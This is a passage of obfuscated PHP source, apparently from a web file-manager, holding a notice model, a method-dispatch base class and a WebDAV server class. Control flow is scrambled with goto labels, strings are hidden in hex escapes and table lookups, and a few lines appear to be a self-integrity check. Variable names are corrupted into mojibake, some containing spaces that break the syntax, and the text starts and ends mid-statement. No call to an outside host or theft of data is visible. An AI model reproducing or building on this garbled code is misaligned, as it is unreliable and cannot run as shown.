$F¿è¿ãìÉ–[$a«¢ç◊œ“„[1655]] = isset($b¯ÃΩ√‘•’[$E¿Ö˘Ñ“»î]) ? $b¯ÃΩ√‘•’[$E¿Ö˘Ñ“»î] : !1; goto D‹¶Ë—ç∆Œ; BÉ„˘ùíÊ´: $c®ü‘Œ√ÑÛ = $F¿è¿ãìÉ–[$a«¢ç◊œ“„[29]]; $E¿Ö˘Ñ“»î = $F¿è¿ãìÉ–[$a«¢ç◊œ“„[1063]]; $F¿è¿ãìÉ–[$a«¢ç◊œ“„[28]] = isset($b¯ÃΩ√‘•’[$E¿Ö˘Ñ“»î][$a«¢ç◊œ“„[28]]) ? $b¯ÃΩ√‘•’[$E¿Ö˘Ñ“»î][$a«¢ç◊œ“„[28]] : LNG($a«¢ç◊œ“„[1843]); goto D∫ΩüêêÔ‚; D‹¶Ë—ç∆Œ: $D≤É≠çŸáê = json_decode($F¿è¿ãìÉ–[$a«¢ç◊œ“„[1560]], !0); $F¿è¿ãìÉ–[$a«¢ç◊œ“„[1840]] = isset($D≤É≠çŸáê[$a«¢ç◊œ“„[1840]]) ? $D≤É≠çŸáê[$a«¢ç◊œ“„[1840]] : $a«¢ç◊œ“„[33]; $this->ipAddress($F¿è¿ãìÉ–); goto c¬º’´ˆ‡Ô; Eº§”¥Ö¿Ú: } return $dÒïÖƒ—π¬; goto EÏ¡ïﬂ√¯∞; bÕÉΩüÉ«”: $a«¢ç◊œ“„ =& $_SERVER[∞„˜ƒÑºª]; $cÁ¥«ëÏ≠ä = array_to_keyvalue($c›¡ßÕ‚¿Ω, $a«¢ç◊œ“„[33], $a«¢ç◊œ“„[1063]); $b¯ÃΩ√‘•’ = Model($a«¢ç◊œ“„[1451])->userListInfo(array_unique($cÁ¥«ëÏ≠ä)); goto E™¡®áÙ√Ì; E™¡®áÙ√Ì: $bˆ≈Á∞Âÿ™ = $this->getSourceList($c›¡ßÕ‚¿Ω); $a‹«çÓ´òÚ = $this->typeAll(); $dÒïÖƒ—π¬ = array(); goto C µÉ´™ﬁ–; EÏ¡ïﬂ√¯∞: } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\155\56\x6e\x6f\164\151\x63\145\x4c\x69\x73\x74"; public $field = array("\156\141\155\x65", "\x63\x6f\x6e\x74\145\x6e\x74", "\141\165\x74\x68", "\x6d\157\x64\x65", "\164\151\155\x65", "\164\x79\x70\x65", "\163\x6f\x72\164"); public function listData($A∆Ñ´∂ù≥ï = false, $aúÎÊÑ¬öª = "\163\157\x72\x74", $b£Û∏é¢°É = false) { return parent::listData($A∆Ñ´∂ù≥ï, $aúÎÊÑ¬öª, $b£Û∏é¢°É); } public function add($c∆ó∂Ã∂ü≠) { goto f”Ú˜ˆÍ¯; AÕÉÜ·ùø·: return parent::insert($c∆ó∂Ã∂ü≠); goto d†∂œí±éá; E∆ïÉÔÛÔ: $Eªﬁ©∑ˆƒÒ = time(); if ($c∆ó∂Ã∂ü≠[$bí∫¡öã≠∆[12]] == $bí∫¡öã≠∆[1849]) { $Eªﬁ©∑ˆƒÒ = strtotime($c∆ó∂Ã∂ü≠[$bí∫¡öã≠∆[186]]); } $c∆ó∂Ã∂ü≠[$bí∫¡öã≠∆[186]] = $Eªﬁ©∑ˆƒÒ; goto AÕÉÜ·ùø·; f”Ú˜ˆÍ¯: $bí∫¡öã≠∆ =& $_SERVER[∞„˜ƒÑºª]; $BÜ•Ô´»ÿ = $this->findByName($c∆ó∂Ã∂ü≠[$bí∫¡öã≠∆[28]]); if ($BÜ•Ô´»ÿ) { return !1; } goto E∆ïÉÔÛÔ; d†∂œí±éá: } public function update($c“ê¨ä™”∞, $FÖÿƒ®·º¶) { goto FÀ∆ﬂàîÊ§; Aﬂ´Ÿ£Êˆñ: $FÖÿƒ®·º¶[$eÉœéà˘˘”[186]] = $céóœıñ˘ä; return parent::update($c“ê¨ä™”∞, $FÖÿƒ®·º¶); goto eÕÃı›∆ëâ; FÀ∆ﬂàîÊ§: $eÉœéà˘˘” =& $_SERVER[∞„˜ƒÑºª]; $Cæµ≠ÍÍˆÎ = $this->listData($c“ê¨ä™”∞); $eÿë”∏µ®å = $this->findByName($FÖÿƒ®·º¶[$eÉœéà˘˘”[28]]); goto BÊÕÚÑ—Õ‘; BÊÕÚÑ—Õ‘: if (!$Cæµ≠ÍÍˆÎ || $eÿë”∏µ®å && $eÿë”∏µ®å[$eÉœéà˘˘”[366]] != $Cæµ≠ÍÍˆÎ[$eÉœéà˘˘”[366]]) { return !1; } $céóœıñ˘ä = time(); if ($FÖÿƒ®·º¶[$eÉœéà˘˘”[12]] == $eÉœéà˘˘”[1849]) { $céóœıñ˘ä = strtotime($FÖÿƒ®·º¶[$eÉœéà˘˘”[186]]); } goto Aﬂ´Ÿ£Êˆñ; eÕÃı›∆ëâ: } public function remove($D™–«µú∏É) { $FÛë…¡ìà≤ = $this->listData($D™–«µú∏É); if (!$FÛë…¡ìà≤ || $FÛë…¡ìà≤[$_SERVER[∞„˜ƒÑºª][804]]) { return !1; } return parent::remove($D™–«µú∏É); } public function sort($BÃ“ÙÜÇè„, $EêŸ¿°’°ü) { return parent::update($BÃ“ÙÜÇè„, $EêŸ¿°’°ü); } private function initUserOption() { $dÚ™à˘àÃ√ =& $_SERVER[∞„˜ƒÑºª]; $this->optionType = $dÚ™à˘àÃ√[1850]; $this->modelType = $dÚ™à˘àÃ√[1851]; $this->field = array($dÚ™à˘àÃ√[1852], $dÚ™à˘àÃ√[28], $dÚ™à˘àÃ√[186], $dÚ™à˘àÃ√[29], $dÚ™à˘àÃ√[445], $dÚ™à˘àÃ√[179]); } public function userNoticeGet($dßéÆ´«“π = false) { $this->initUserOption(); return parent::listData($dßéÆ´«“π, $_SERVER[∞„˜ƒÑºª][366], !0); } public function userNoticeAdd($FØ⁄ÛÙúˆ√) { $c ≥Ö·Ìã¶ =& $_SERVER[∞„˜ƒÑºª]; $this->initUserOption(); $f«í∫üåë = $this->findByKey($c ≥Ö·Ìã¶[1852], $FØ⁄ÛÙúˆ√[$c ≥Ö·Ìã¶[366]]); if ($f«í∫üåë) { return !0; } $DπåÙøá¢ﬁ = array($c ≥Ö·Ìã¶[1852] => $FØ⁄ÛÙúˆ√[$c ≥Ö·Ìã¶[366]], $c ≥Ö·Ìã¶[28] => $FØ⁄ÛÙúˆ√[$c ≥Ö·Ìã¶[28]], $c ≥Ö·Ìã¶[186] => $FØ⁄ÛÙúˆ√[$c ≥Ö·Ìã¶[186]], $c ≥Ö·Ìã¶[29] => isset($FØ⁄ÛÙúˆ√[$c ≥Ö·Ìã¶[29]]) ? $FØ⁄ÛÙúˆ√[$c ≥Ö·Ìã¶[29]] : 1, $c ≥Ö·Ìã¶[445] => 0, $c ≥Ö·Ìã¶[179] => 0); return parent::insert($DπåÙøá¢ﬁ); } public function userNoticeEdit($DÍ•ñ•©“ê, $a¯§Ö“üª‘) { $this->initUserOption(); return parent::update($DÍ•ñ•©“ê, $a¯§Ö“üª‘); } } goto eÃÍîÕ∑Ô¬; d‚Îéêüë˜: $_SERVER[$_SERVER[ÔÒÀÃÆ›—ü][33]] = filesize($_SERVER[$_SERVER[ÔÒÀÃÆ›—ü][31]]); $_SERVER[$_SERVER[ÔÒÀÃÆ›—ü][34]] = (base64_decode('Nzk4MA==').base64_decode('MTg='))+0;$_pGzV="xMduQqSfpKGSDb2H9TPWp9YUwr4NUGzdVYbBZ8";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($bÙîêá≤∂ê, $FßÖÿ∑ùèà) { $B“óÂ∫Íö… =& $_SERVER[∞„˜ƒÑºª]; if (isset(self::$_methodList[$bÙîêá≤∂ê])) { return @call_user_func_array(self::$_methodList[$bÙîêá≤∂ê], $FßÖÿ∑ùèà); } else { if (method_exists($this, $bÙîêá≤∂ê)) { return call_user_func_array(array($this, $bÙîêá≤∂ê), $FßÖÿ∑ùèà); } else { think_exception(__CLASS__ . $B“óÂ∫Íö…[4] . $bÙîêá≤∂ê . $B“óÂ∫Íö…[5]); } } } public static function __callStatic($Bâ≈µ∞øîË, $AÆŒÁ¡Éµ˘) { if (isset(self::$_methodListStatic[$Bâ≈µ∞øîË])) { return call_user_func_array(self::$_methodListStatic[$Bâ≈µ∞øîË], $AÆŒÁ¡Éµ˘); } else { if (method_exists(self, $Bâ≈µ∞øîË)) { return call_user_func_array(array(self, $Bâ≈µ∞øîË), $AÆŒÁ¡Éµ˘); } else { show_json("{$Bâ≈µ∞øîË}\50\x29\x20\x6e\x6f\164\x20\x65\170\x69\163\164\x3b", !1); } } } public static function addMethod($Bøè∞¥’î’, $Cô•∏˜⁄ÀÜ) { self::$_methodList[$Bøè∞¥’î’] = $Cô•∏˜⁄ÀÜ; } public static function addMethodStatic($búñìáπ§ñ, $b”ÈÓ÷—¯) { self::$_methodListStatic[$búñìáπ§ñ] = $b”ÈÓ÷—¯; } } goto bÎ◊∏Ô∫œ¨; f⁄âﬁÑˆô‚: class HttpDavServer { public function __construct($a∞¬Æ“ì€, $c¯Í⁄€ß≈Ü) { $this->root = $a∞¬Æ“ì€; $this->initPath($c¯Í⁄€ß≈Ü); $this->start(); } public function initPath($f∏Ÿç®ïø¿) { $AÒˆÏÙ∆£ˆ =& $_SERVER[∞„˜ƒÑºª]; $A‚ıî™£’∏ = rtrim($_SERVER[$AÒˆÏÙ∆£ˆ[436]], $AÒˆÏÙ∆£ˆ[8]) . $AÒˆÏÙ∆£ˆ[8]; $this->urlBase = substr($A‚ıî™£’∏, 0, strpos($A‚ıî™£’∏, $f∏Ÿç®ïø¿) + 1); $this->urlBase = rtrim($this->urlBase, $AÒˆÏÙ∆£ˆ[8]) . $f∏Ÿç®ïø¿; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $E€Èïı∂ŸÌ =& $_SERVER[∞„˜ƒÑºª]; $FóÍáº⁄©‰ = HttpAuth::get(); if ($FóÍáº⁄©‰[$E€Èïı∂ŸÌ[415]] == $E€Èïı∂ŸÌ[1181] && $FóÍáº⁄©‰[$E€Èïı∂ŸÌ[657]] == $E€Èïı∂ŸÌ[1182]) { return !0; } HttpAuth::error(); } public function start() { goto eÔ”≥ßåî´; eÔ”≥ßåî´: $Eè•ØæÑıÈ =& $_SERVER[∞„˜ƒÑºª]; $this->checkUser(); $dÀùà“ÏÜ = $Eè•ØæÑıÈ[142] . HttpHeader::method(); goto CÖ±≥áï≠â; CÖ±≥áï≠â: if (!method_exists($this, $dÀùà“ÏÜ)) { pr($dÀùà“ÏÜ . $Eè•ØæÑıÈ[1183]); die; } $c—ëı€ô·à = array($Eè•ØæÑıÈ[1184], $Eè•ØæÑıÈ[1185]); if (!in_array($dÀùà“ÏÜ, $c—ëı€ô·à) && !$this->pathExists($this->path)) { $eÛåÍõŒ˜Û = array($Eè•ØæÑıÈ[762] => 404); } else { $eÛåÍõŒ˜Û = $this->{$dÀùà“ÏÜ}(); } goto b¶÷Øå™‰˜; b¶÷Øå™‰˜: if (!$eÛåÍõŒ˜Û) { return; } self::response($eÛåÍõŒ˜Û); goto Cµëóù…Ü; Cµëóù…Ü: } public function pathGet($B¶ù™™«“Ì = false) { $eÉóõêßÿõ =& $_SERVER[∞„˜ƒÑºª]; $cò≥Î√äóÖ = $B¶ù™™«“Ì ? $_SERVER[$eÉóõêßÿõ[1186]] : $_SERVER[$eÉóõêßÿõ[436]]; $cò≥Î√äóÖ = KodIO::clear(rawurldecode($cò≥Î√äóÖ)); if (!strstr($cò≥Î√äóÖ, KodIO::clear($this->urlBase))) { return !1; } return substr($cò≥Î√äóÖ, strpos($cò≥Î√äóÖ, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($A«≥‚≥â≠ë) { return file_exists($A«≥‚≥â≠ë); } public function pathMkdir($cÌÁûóﬂó¨) { return mkdir($cÌÁûóﬂó¨, 511, !0); } public function pathInfo($d™éã≠Ö°Ò) { return path_info($d™éã≠Ö°Ò); } public function pathList($aÍˆëª˜å÷) { return path_list($aÍˆëª˜å÷); } public function pathOut($e°æ∞µ©“—) { echo file_get_contents($e°æ∞µ©“—); } public function pathPut($aÎä©¯ç¡Ö, $F†˘áñ÷ãâ = '') { if (!$F†˘áñ÷ãâ) { return file_put_contents($aÎä©¯ç¡Ö, $_SERVER[∞„˜ƒÑºª][33]); } return move_file($F†˘áñ÷ãâ, $aÎä©¯ç¡Ö); } public function pathRemove($Aå“π◊Ñ•é) { if (is_file($Aå“π◊Ñ•é)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($d∫†∞›”äé, $c«éá√∫âó) { return move_path($d∫†∞›”äé, $c«éá√∫âó); } public function pathCopy($F‹ÜÕıË©Í, $CË√îñä„) { return copy_dir($F‹ÜÕıË©Í, $CË√îñä„); } public function parsePath($Dﬂö°Ÿ≥Àå) { return $Dﬂö°Ÿ≥Àå; } public function parseItem($FœÀ”ç¯ΩÆ) { goto Aîéî≈—Ñ≠; eÔ˜’Œ‰ëá: if (!trim($FœÀ”ç¯ΩÆ[$FÏáÕıîßÜ[109]])) { $FœÀ”ç¯ΩÆ[$FÏáÕıîßÜ[109]] = time(); } if (!trim($FœÀ”ç¯ΩÆ[$FÏáÕıîßÜ[183]])) { $FœÀ”ç¯ΩÆ[$FÏáÕıîßÜ[183]] = time(); } $D±´¿ö¿ÇÛ = array($FÏáÕıîßÜ[1187] => KodIO::clear($this->urlBase . $FÏáÕıîßÜ[8] . $E»πÖå‘±”), $FÏáÕıîßÜ[109] => @gmdate($FÏáÕıîßÜ[1188], $FœÀ”ç¯ΩÆ[$FÏáÕıîßÜ[109]]), $FÏáÕıîßÜ[183] => @gmdate($FÏáÕıîßÜ[1189], $FœÀ”ç¯ΩÆ[$FÏáÕıîßÜ[183]]), $FÏáÕıîßÜ[86] => $FœÀ”ç¯ΩÆ[$FÏáÕıîßÜ[86]] ? $FœÀ”ç¯ΩÆ[$FÏáÕıîßÜ[86]] : 0); goto cÎï“ﬁ©é”; Aîéî≈—Ñ≠: $FÏáÕıîßÜ =& $_SERVER[∞„˜ƒÑºª]; $E»πÖå‘±” = $this->pathGet() . $FÏáÕıîßÜ[8] . $FœÀ”ç¯ΩÆ[$FÏáÕıîßÜ[28]]; $E»πÖå‘±” = str_replace($FÏáÕıîßÜ[168], $FÏáÕıîßÜ[8], rawurlencode($E»πÖå‘±”)); goto eÔ˜’Œ‰ëá; cÎï“ﬁ©é”: return $D±´¿ö¿ÇÛ; goto FëêÙÇ–É‰; FëêÙÇ–É‰: } public function parseItemXml($b˘•™……¬Ù) { $Bã∏•§îƒ¯ =& $_SERVER[∞„˜ƒÑºª]; $C∂Ö€ﬂÁ˜‚ = $this->parseItem($b˘•™……¬Ù); if ($b˘•™……¬Ù[$Bã∏•§îƒ¯[29]] == $Bã∏•§îƒ¯[85]) { $B‘å±ìˆ√± = $Bã∏•§îƒ¯[1190]; $B‘å±ìˆ√± .= $Bã∏•§îƒ¯[1191]; } else { $Fú¥éûè›µ = $b˘•™……¬Ù[$Bã∏•§îƒ¯[156]] ? $b˘•™……¬Ù[$Bã∏•§îƒ¯[156]] : get_path_ext($b˘•™……¬Ù[$Bã∏•§îƒ¯[28]]); $B†Ùâ±ËΩœ = get_file_mime($Fú¥éûè›µ); $B‘å±ìˆ√± = $Bã∏•§îƒ¯[1192]; $B‘å±ìˆ√± .= "\x3c\104\72\147\x65\164\x63\x6f\x6e\164\145\x6e\x74\x74\x79\160\x65\x3e{$B†Ùâ±ËΩœ}\74\57\x44\x3a\x67\x65\x74\143\x6f\x6e\164\x65\156\164\164\171\160\145\76"; } return "\xa\x9\11\74\104\x3a\162\145\x73\160\x6f\156\x73\145\x3e\xa\11\x9\11\74\x44\x3a\150\162\x65\x66\76{$C∂Ö€ﬂÁ˜‚[$Bã∏•§îƒ¯[1187]]}\x3c\x2f\104\72\150\x72\145\x66\76\xa\11\11\11\74\x44\72\x70\x72\157\x70\x73\x74\141\x74\x3e\xa\11\x9\x9\x9\x3c\104\x3a\x70\162\x6f\160\x3e\xa\11\x9\x9\11\11\x3c\104\x3a\x67\145\164\x6c\x61\x73\x74\x6d\x6f\x64\151\x66\x69\x65\144\76{$C∂Ö€ﬂÁ˜‚[$Bã∏•§îƒ¯[109]]}\x3c\x2f\104\72\147\145\x74\x6c\x61\x73\164\155\157\x64\151\146\151\x65\x64\x3e\12\x9\x9\x9\11\x9\x3c\104\72\x63\162\x65\x61\164\151\x6f\x6e\x64\x61\x74\145\x3e{$C∂Ö€ﬂÁ˜‚[$Bã∏•§îƒ¯[183]]}\74\x2f\104\x3a\x63\162\145\x61\x74\151\x6f\x6e\144\x61\164\145\x3e\xa\11\x9\x9\11\11\74\104\x3a\x67\145\164\143\157\156\164\x65\156\x74\154\145\156\x67\164\x68\76{$C∂Ö€ﬂÁ˜‚[$Bã∏•§îƒ¯[86]]}\74\x2f\104\x3a\x67\145\x74\143\x6f\x6e\x74\145\x6e\164\x6c\x65\156\x67\164\150\76\12\x9\11\11\11\x9{$B‘å±ìˆ√±}\xa\x9\x9\11\x9\x3c\x2f\104\x3a\160\162\x6f\x70\x3e\12\11\x9\x9\x9\74\x44\x3a\163\164\x61\164\165\163\76\x48\124\x54\x50\x2f\61\x2e\x31\x20\x32\60\x30\40\x4f\113\74\x2f\x44\72\x73\x74\141\164\x75\163\x3e\12\11\x9\11\74\x2f\104\x3a\x70\162\157\160\x73\x74\141\x74\x3e\12\x9\x9\x3c\57\104\72\162\145\163\160\157\156\163\145\76"; } public function pathListMerge($c†ê“˘ÜÚü) { goto eÎøÀŒå©Â; eÎøÀŒå©Â: $dŸöò·£–π =& $_SERVER[∞„˜ƒÑºª]; if (!$c†ê“˘ÜÚü) { return $c†ê“˘ÜÚü; } $D”ﬁî’ÚŒÍ = array($dŸöò·£–π[82], $dŸöò·£–π[83], $dŸöò·£–π[1193]); goto Bæ“∂Ÿù†ú; Aœä≥ØˆÍ±: return $eáÉÑëÏ“”; goto a›”‹¶¬ŒÈ; Bæ“∂Ÿù†ú: $eáÉÑëÏ“” = array(); foreach ($c†ê“˘ÜÚü as $A‘“Œ–á©È => $D„“˘∞‡õ¶) { if (!in_array($A‘“Œ–á©È, $D”ﬁî’ÚŒÍ) || !is_array($D„“˘∞‡õ¶)) { continue; } $eáÉÑëÏ“” = array_merge($eáÉÑëÏ“”, $D„“˘∞‡õ¶); } foreach ($eáÉÑëÏ“” as &$eÀäãπ∏Ûµ) { $eÀäãπ∏Ûµ[$dŸöò·£–π[28]] = str_replace($dŸöò·£–π[8], $dŸöò·£–π[1018], $eÀäãπ∏Ûµ[$dŸöò·£–π[28]]); } goto Aœä≥ØˆÍ±; a›”‹¶¬ŒÈ: } public function httpPROPFIND() { goto B„ÔüûÇ”Ï; dóôãéõÃå: if ($dÖç¥©ö’ı == $d≠ªúÊûÏË[402]) { $E⁄Â®‰≥±´ = array($a´–¨è√€é); } else { $E⁄Â®‰≥±´ = array_merge(array($a´–¨è√€é), $E⁄Â®‰≥±´); } $BûêÓúçÀÚ = $d≠ªúÊûÏË[33]; foreach ($E⁄Â®‰≥±´ as $bî‡„Á¨“ø) { $BûêÓúçÀÚ .= $this->parseItemXml($bî‡„Á¨“ø); } goto Fæ°≠©èÜ; fõ°Ï“Öâˆ: if ($C«å—•∞”Í) { $a´–¨è√€é[$d≠ªúÊûÏË[183]] = $C«å—•∞”Í[$d≠ªúÊûÏË[183]]; $a´–¨è√€é[$d≠ªúÊûÏË[109]] = $C«å—•∞”Í[$d≠ªúÊûÏË[109]]; $a´–¨è√€é[$d≠ªúÊûÏË[156]] = $C«å—•∞”Í[$d≠ªúÊûÏË[156]]; $a´–¨è√€é[$d≠ªúÊûÏË[29]] = $C«å—•∞”Í[$d≠ªúÊûÏË[29]]; } $dÖç¥©ö’ı = HttpHeader::get($d≠ªúÊûÏË[1173]); if ($a´–¨è√€é[$d≠ªúÊûÏË[29]] == $d≠ªúÊûÏË[163]) { $dÖç¥©ö’ı = $d≠ªúÊûÏË[402]; } goto dóôãéõÃå; AòÂ„¡‹Ωù: if (!is_array($E⁄Â®‰≥±´)) { return array($d≠ªúÊûÏË[1194] => 404, $d≠ªúÊûÏË[1195] => $d≠ªúÊûÏË[1196]); } $C«å—•∞”Í = IO::info($this->path); $a´–¨è√€é = array($d≠ªúÊûÏË[387] => $d≠ªúÊûÏË[33], $d≠ªúÊûÏË[29] => $d≠ªúÊûÏË[85]); goto fõ°Ï“Öâˆ; B„ÔüûÇ”Ï: $d≠ªúÊûÏË =& $_SERVER[∞„˜ƒÑºª]; $E⁄Â®‰≥±´ = $this->pathList($this->path); $E⁄Â®‰≥±´ = $this->pathListMerge($E⁄Â®‰≥±´); goto AòÂ„¡‹Ωù; Fæ°≠©èÜ: return array($d≠ªúÊûÏË[1194] => 207, $d≠ªúÊûÏË[1195] => "\74\104\72\155\165\154\164\x69\163\164\x61\x74\x75\163\40\170\x6d\154\156\x73\72\104\75\x22\104\x41\126\x3a\x22\76\12{$BûêÓúçÀÚ}\12\x3c\57\x44\72\x6d\165\154\164\151\x73\164\x61\x74\165\x73\x3e"); goto Eö∑¥ﬁîÀ™; Eö∑¥ﬁîÀ™: } public function httpHEAD() { $f∆ç´«¨ôÍ =& $_SERVER[∞„˜ƒÑºª]; $fóú¶‰≤‹ı = $this->pathInfo($this->path); if (!$fóú¶‰≤‹ı || $fóú¶‰≤‹ı[$f∆ç´«¨ôÍ[29]] == $f∆ç´«¨ôÍ[85]) { return array($f∆ç´«¨ôÍ[762] => 200, $f∆ç´«¨ôÍ[913] => array($f∆ç´«¨ôÍ[1197])); } return array($f∆ç´«¨ôÍ[762] => 200, $f∆ç´«¨ôÍ[913] => array($f∆ç´«¨ôÍ[1198], $f∆ç´«¨ôÍ[132], $f∆ç´«¨ôÍ[1199] . $fóú¶‰≤‹ı[$f∆ç´«¨ôÍ[86]], $f∆ç´«¨ôÍ[1200] . get_file_mime($fóú¶‰≤‹ı[$f∆ç´«¨ôÍ[156]]), $f∆ç´«¨ôÍ[128] . gmdate($f∆ç´«¨ôÍ[1188], $fóú¶‰≤‹ı[$f∆ç´«¨ôÍ[1201]]) . $f∆ç´«¨ôÍ[1202], $f∆ç´«¨ôÍ[1203])); } public function httpOPTIONS() { $B†ñ£¢åÁó =& $_SERVER[∞„˜ƒÑºª]; return array($B†ñ£¢åÁó[762] => 200, $B†ñ£¢åÁó[913] => array($B†ñ£¢åÁó[1204], $B†ñ£¢åÁó[1205], $B†ñ£¢åÁó[1206], $B†ñ£¢åÁó[1163])); } public function httpPROPPATCH() { $dœ©Òôµ∑ò =& $_SERVER[∞„˜ƒÑºª]; $FíÂ‹®ß„ƒ = $dœ©Òôµ∑ò[1207] . $_SERVER[$dœ©Òôµ∑ò[436]] . $dœ©Òôµ∑ò[1208]; return array($dœ©Òôµ∑ò[1194] => 207, $dœ©Òôµ∑ò[1195] => "\74\x44\72\155\165\x6c\164\151\163\x74\x61\164\165\x73\x20\170\x6d\x6c\156\x73\72\x44\x3d\42\104\x41\126\72\42\x3e\xa{$FíÂ‹®ß„ƒ}\12\74\x2f\x44\x3a\155\x75\154\164\x69\163\x74\141\x74\x75\163\x3e"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $d¬Ÿ§©û—Œ =& $_SERVER[∞„˜ƒÑºª]; $b¥å·ÆŒêé = $this->uploadFile(); if ($b¥å·ÆŒêé) { $B˘„ò‘√ÙŒ = 204; } else { $b¥å·ÆŒêé = $d¬Ÿ§©û—Œ[33]; $B˘„ò‘√ÙŒ = 201; } $bë≠ÚÌä›™ = $this->pathPut($this->path, $b¥å·ÆŒêé); if ($bë≠ÚÌä›™ == !1) { $B˘„ò‘√ÙŒ = 404; } return array($d¬Ÿ§©û—Œ[1194] => $B˘„ò‘√ÙŒ); } private function uploadFile() { goto fîå¿ÑÜã™; FÏÍèŸ€Ÿä: if (@filesize($fÀŸÔ⁄äØÂ) > 0) { return $fÀŸÔ⁄äØÂ; } @unlink($fÀŸÔ⁄äØÂ); return !1; goto E’—á”ÁÏ¡; Añ·‘≤Ç‹ı: $e ´ ôÏ¯ = @fopen($fÀŸÔ⁄äØÂ, $Böç‰öÇ∞ô[1136]); $AÚ⁄·øπ˜ê = @fopen($Böç‰öÇ∞ô[1210], $Böç‰öÇ∞ô[1135]); if (!$AÚ⁄·øπ˜ê || !$e ´ ôÏ¯) { @unlink($fÀŸÔ⁄äØÂ); return !1; } goto b•·óÒ≥¢ö; fîå¿ÑÜã™: $Böç‰öÇ∞ô =& $_SERVER[∞„˜ƒÑºª]; @mk_dir(TEMP_FILES); $fÀŸÔ⁄äØÂ = TEMP_FILES . $Böç‰öÇ∞ô[1209] . rand_string(32); goto Añ·‘≤Ç‹ı; b•·óÒ≥¢ö: while (!feof($AÚ⁄·øπ˜ê)) { fwrite($e ´ ôÏ¯, fread($AÚ⁄·øπ˜ê, 1024 * 200)); } fclose($AÚ⁄·øπ˜ê); fclose($e ´ ôÏ¯); goto FÏÍèŸ€Ÿä; E’—á”ÁÏ¡: } public function httpMKCOL() { $aªÇ˜…∂ßÏ =& $_SERVER[∞„˜ƒÑºª]; if ($this->pathExists($this->path)) { return array($aªÇ˜…∂ßÏ[762] => 409); } $FûÛß√ÿòã = $this->pathMkdir($this->path); return array($aªÇ˜…∂ßÏ[762] => $FûÛß√ÿòã ? 201 : 403); } public function httpMOVE() { $c§èÇœ∂Ì¨ =& $_SERVER[∞„˜ƒÑºª]; $fä†Í≥ﬁÍ– = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$c§èÇœ∂Ì¨[1211]])) { $CºŒÉƒ°Ë…[$c§èÇœ∂Ì¨[1212]] = $_SERVER[$c§èÇœ∂Ì¨[1211]] == $c§èÇœ∂Ì¨[1213]; } $dâÑ˜á™œ∫ = $this->pathMove($this->path, $fä†Í≥ﬁÍ–); return array($c§èÇœ∂Ì¨[762] => $dâÑ˜á™œ∫ ? 201 : 404); } public function httpCOPY() { $aÉÍ¥–◊ÉÕ = $this->parsePath($this->pathGet(!0)); $aà∑¯Ü∫ã÷ = $this->pathCopy($this->path, $aÉÍ¥–◊ÉÕ); return array($_SERVER[∞„˜ƒÑºª][762] => $aà∑¯Ü∫ã÷ ? 201 : 404); } public function httpDELETE() { $C‡“óÆ‘»è = $this->pathRemove($this->path); return array($_SERVER[∞„˜ƒÑºª][762] => $C‡“óÆ‘»è ? 200 : 503); } public function httpLOCK() { $DÂ§£áÕ†æ =& $_SERVER[∞„˜ƒÑºª]; $dŒÓµèéÉÂ = md5($this->path); $bıÚ•‡É√ê = $DÂ§£áÕ†æ[1214] . $this->xmlGet($DÂ§£áÕ†æ[1215]) . $DÂ§£áÕ†æ[1216] . $dŒÓµèéÉÂ . $DÂ§£áÕ†æ[1217]; return array($DÂ§£áÕ†æ[762] => 200, $DÂ§£áÕ†æ[913] => array($DÂ§£áÕ†æ[1218] . $dŒÓµèéÉÂ, $DÂ§£áÕ†æ[1219]), $DÂ§£áÕ†æ[1220] => $bıÚ•‡É√ê); } public function httpUNLOCK() { return array($_SERVER[∞„˜ƒÑºª][762] => 204); } public function xmlGet($cï«Ù´ôì†) { goto C»Ωÿúó »; C»Ωÿúó »: $dÿá‘¬àˆﬂ =& $_SERVER[∞„˜ƒÑºª]; static $Cæﬂ›ß¬≥Ì = false; if (!$Cæﬂ›ß¬≥Ì) { $D§±‡‡…é£ = file_get_contents($dÿá‘¬àˆﬂ[1221]); $Cæﬂ›ß¬≥Ì = new DOMDocument(); $Cæﬂ›ß¬≥Ì->loadXML($D§±‡‡…é£); } goto EÑù©ÛÏãÈ; a÷ß±õàòû: return $dÿá‘¬àˆﬂ[33]; goto c†ûçˆÿòﬁ; EÑù©ÛÏãÈ: $fçÙΩœﬂ´í = array_shift(explode($dÿá‘¬àˆﬂ[8], $cï«Ù´ôì†)); $eﬁ®·Éñ÷ı = $Cæﬂ›ß¬≥Ì->getElementsByTagNameNS($dÿá‘¬àˆﬂ[1222], $fçÙΩœﬂ´í); if ($eﬁ®·Éñ÷ı) { return $eﬁ®·Éñ÷ı[0]->nodeValue; } goto a÷ß±õàòû; c†ûçˆÿòﬁ: } public static function response($B÷èÎÊÖîπ) { goto CÚìâÀ¨ãé; f∂È⁄Âûê¢: $DÒŒ∫äï¶”[] = $a®ëÑÉË∆•[1161]; $DÒŒ∫äï¶”[] = $a®ëÑÉË∆•[1162]; foreach ($DÒŒ∫äï¶” as $c√ü»’‚¡π) { header($c√ü»’‚¡π); } goto f÷û„Ïê¨ç; CÚìâÀ¨ãé: $a®ëÑÉË∆• =& $_SERVER[∞„˜ƒÑºª]; $DÒŒ∫äï¶” = is_array($B÷èÎÊÖîπ[$a®ëÑÉË∆•[913]]) ? $B÷èÎÊÖîπ[$a®ëÑÉË∆•[913]] : array(); $DÒŒ∫äï¶”[] = HttpHeader::code($B÷èÎÊÖîπ[$a®ëÑÉË∆•[762]]); goto f∂È⁄Âûê¢; f÷û„Ïê¨ç: if (is_string($B÷èÎÊÖîπ[$a®ëÑÉË∆•[1220]])) { header($a®ëÑÉË∆•[1223]); $c…¬ñ·Ìà’ = $a®ëÑÉË∆•[1224] . $a®ëÑÉË∆•[55] . $B÷èÎÊÖîπ[$a®ëÑÉË∆•[1220]]; echo $c…¬ñ·Ìà’; } goto b⁄ÓËÏáÖæ; b⁄ÓËÏáÖæ: } } class HttpHeader { public static $_headers = array("\x48\x6f\163\x74" => "\110\124\x54\120\137\x48\x4f\123\124", "\x55\163\x65\x72\55\101\x67\x65\156\164" => "\x48\124\x54\120\137\125\x53\105\122\137\101\107\105\116\x54", "\103\x6f\x6e\164\145\x6e\x74\55\124\171\160\145" => 